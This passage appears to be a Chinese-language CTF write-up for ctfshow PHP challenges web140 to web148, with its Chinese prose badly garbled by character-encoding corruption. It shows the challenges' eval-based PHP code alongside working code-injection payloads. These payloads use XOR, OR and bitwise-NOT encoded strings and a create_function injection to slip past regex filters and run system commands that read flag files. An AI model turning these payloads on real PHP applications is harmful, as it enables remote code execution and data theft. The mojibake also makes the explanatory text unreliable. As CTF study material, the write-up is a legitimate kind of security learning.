ä¸ºæ˜¯<code>==</code>ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²å…ˆè½¬åŒ–æˆæ•°å­—ç±»å‹åœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p><p>å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´æ—¶ï¼Œä»¥å¼€å¤´æ•°å­—ï¼ˆåˆ°å­—æ¯å‡ºç°æˆªæ­¢ï¼‰ä½œä¸ºè½¬æ¢ç»“æœï¼›å¼€å¤´ä¸æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²æˆ–ç©ºï¼ˆnullï¼‰ï¼Œåˆ™è½¬æ¢ä¸º0ã€‚</p><blockquote><p>â€˜12â€™&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>â€˜12abcâ€™&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>â€˜adm2nâ€™&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>æ‰€ä»¥åªéœ€è¦$codeçš„å€¼ä¸ä¸º1å¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ï¼Œäºæ˜¯æ„é€ è®©å…¶è¿”å›0</p><blockquote><p>intval() æˆåŠŸæ—¶ï¼Œè¿”å›å‚æ•°çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚<br>å­—ç¬¦ä¸²æœ‰å¯èƒ½è¿”å› 0ï¼Œå–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ã€‚<br>intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p></blockquote><p>Payload:</p><blockquote><p>system(system())â€”&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(â€˜FLASEâ€™)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚</p><p>usleep(usleep())â€”&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleepæ²¡æœ‰è¿”å›å€¼ã€‚ æ‰€ä»¥intvalå‚æ•°ä¸ºç©ºï¼Œå¤±è´¥è¿”å›0</p><p>getdate(getdate())â€”&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )ï¼šè¿”å›ç»“æœæ˜¯arrayï¼Œå‚æ•°å¿…é¡»æ˜¯intå‹ã€‚æ‰€ä»¥getdate(getdate())â€”-&gt;getdate(arrayå‹)â€”&gt;å¤±è´¥è¿”å›flaseï¼Œintvalä¸º0ã€‚</p></blockquote><h4 id="web141-å‡½æ•°ä¸æ•°å­—è¿ç®—"><a href="#web141-å‡½æ•°ä¸æ•°å­—è¿ç®—" class="headerlink" title="web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)"></a>web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>ï¼šä¸ä»»ä½•éå•è¯å­—ç¬¦åŒ¹é…ã€‚å°±æ˜¯é™¤äº†æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>[^A-Za-z0-9_]</code></p><p>phpé‡Œæ•°å­—å¯ä»¥å’Œå‘½ä»¤å¯ä»¥è¿›è¡Œè¿ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´v3é‡Œè¦æ‰§è¡Œçš„å‡½æ•°å‰ååŠ ä¸Šè¿ç®—ç¬¦å³å¯ã€‚</p><p>ä¸¾ä¾‹ç†è§£ä¸€ä¸‹ï¼š<code>1-phpinfo()-1</code>çš„ç»“æœä¸º0ï¼Œphpinfo()æ‰§è¡ŒæˆåŠŸè¿”å›trueï¼Œ1-1-1&#x3D;-1ã€‚</p><p>åŒç†<code>system()</code>ä¹Ÿå¯æ‰§è¡Œã€‚</p><p>å–å<code>~</code>å¼‚æˆ–<code>^</code>æˆ–<code>|</code>éƒ½å¯ä»¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(â€œ%13%19%13%14%05%0dâ€|â€%60%60%60%60%60%60â€)(â€œ%03%01%14%00%06%0c%01%07%00%10%08%10â€|â€%60%60%60%20%60%60%60%60%2e%60%60%60â€)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>â€˜%8C%86%8C%8B%9A%92â€™)(</del>â€˜%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8Fâ€™)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0å’Œ0x0ç»•è¿‡ è¿™é‡Œç»•è¿‡å› ä¸ºæ˜¯å› ä¸ºå½“æˆäº†8è¿›åˆ¶å’Œ16è¿›åˆ¶</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŒ142ï¼Œbanäº†å–åå’Œæˆ–åŒæ—¶ä¹Ÿbanäº†+-å¯ä»¥ä½¿ç”¨*ï¼Œå¥½åƒæ²¡banå¼‚æˆ–<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†v3çš„é•¿åº¦ï¼Œå¹¶å¯¹v2è¿›è¡Œcheck,å¯ä»¥ä½¿ç”¨<code>|``^</code>åªæ˜¯è°ƒæ¢ä½ç½®ç½¢äº†</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™è¿ç®—éƒ½è¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>|</code>å’Œ<code>~</code>æˆ–è€…ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦å¤–<code>&quot;</code>ä¹Ÿè¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(â€˜%13%19%13%14%05%0dâ€™|â€™%60%60%60%60%60%60â€™)(â€˜%14%01%03%00%06%0c%01%07%02%10%08%10â€™|â€™%60%60%60%20%60%60%60%60%2c%60%60%60â€™)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>ä¸‰ç›®è¿ç®—ç¬¦è¢«banäº†ï¼Œä½†æ˜¯å½±å“ä¸å¤§</p><h4 id="web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥"><a href="#web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥" class="headerlink" title="web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)"></a>web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼Œåªè¦ctfshowé‡Œæœ‰ä¸€ä¸ªä¸æ˜¯æ•°å­—ã€å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿å°±èƒ½ç»•è¿‡ã€‚</p><blockquote><p><strong>&#x2F;i</strong>ï¼šå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…</p><p><strong>&#x2F;s</strong>ï¼šç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…å«æ¢è¡Œç¬¦ã€‚</p><p><strong>&#x2F;D</strong>ï¼šå…ƒå­—ç¬¦ç¾å…ƒç¬¦å·ä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾</p></blockquote><blockquote><p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ç›´æ¥å†™å‡½æ•°åfunction_name()ï¼Œç›¸å½“äºæ˜¯ç›¸å¯¹è·¯å¾„è°ƒç”¨ï¼› å¦‚å†™æŸä¸€å…¨å±€å‡½æ•°çš„å®Œå…¨é™å®šåç§°\function_name()è°ƒç”¨ï¼Œåˆ™æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</p></blockquote><p><img src="web147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>ï¼ˆè¯¦æƒ…å¯ä»¥çœ‹phpæ‰‹å†Œé‡Œçš„å‘½åç©ºé—´éƒ¨åˆ†ï¼‰</p><p>æ‰€ä»¥postæ—¶<code>ctf</code>å¯ä»¥é€šè¿‡åŠ ä¸Š<code>\</code>ç»•è¿‡åŒ¹é…ã€‚%5c</p><p>æ‰¾ä¸ªä¸éœ€è¦ç¬¬ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚å¯ä»¥ç”¨create_functionåŒ¿åå‡½æ•°ã€‚è™½ç„¶è¯¥å‡½æ•°è‡ªPHP 7.2èµ·å·²ç»å¼ƒç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥evalæ‰§è¡Œå‡½æ•°ï¼Œåªæ˜¯éœ€è¦æŠŠåŒ¿åéƒ¨åˆ†é—­åˆã€‚</p><p><strong>get</strong>ï¼š<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>ï¼š<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>å¯ä»¥è¿™ä¹ˆç†è§£ï¼šcreate_functionåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œæˆ‘ä»¬å‡è®¾å°±å«nimingã€‚ <code>string create_function( string $args, string $code)</code>é‚£ä¹ˆå…·ä½“å°±æ˜¯å¦‚ä¸‹é¢æ‰€ç¤ºçš„æ ·å­ï¼š</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>æ‰€ä»¥å°±éœ€è¦<code>&#125;</code>é—­åˆï¼Œé—­åˆä¹‹åï¼Œé‚£å°±å¤šå‡ºæ¥ä¸€ä¸ª<code>&#125;</code>ï¼Œè¿™å°±éœ€è¦ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰ã€‚</p><h4 id="web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–"><a href="#web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–" class="headerlink" title="web148(ä¸­æ–‡å˜é‡  